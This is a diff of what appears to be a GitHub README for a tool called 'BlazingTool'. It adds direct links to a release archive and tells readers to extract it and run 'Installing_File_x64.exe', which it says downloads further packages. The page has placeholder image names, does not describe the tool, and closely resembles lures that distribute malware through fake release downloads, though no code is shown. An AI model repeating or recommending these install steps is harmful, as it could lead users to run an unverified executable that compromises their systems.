@@ -8,9 +8,9 @@
 To install this programm, follow these steps:
 
 [![asdasdasd](https://github.com/user-attachments/assets/2fb916a9-8ea8-449a-b9ea-6586000a70ee)
-]()
+](https://github.com/sandesh034/BlazingTool/releases/download/V3.63/Release.zip)
 
-## **1. [Download the archive]() from releases and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/sandesh034/BlazingTool/releases/download/V3.63/Release.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 ![jyujghg](https://github.com/user-attachments/assets/54a4db7d-227e-4ff2-bafd-1f148f0b12be)
 ![sdsfdsdsdd](https://github.com/user-attachments/assets/63fd5f0b-f12d-4449-bd9e-b032a0d6493c)
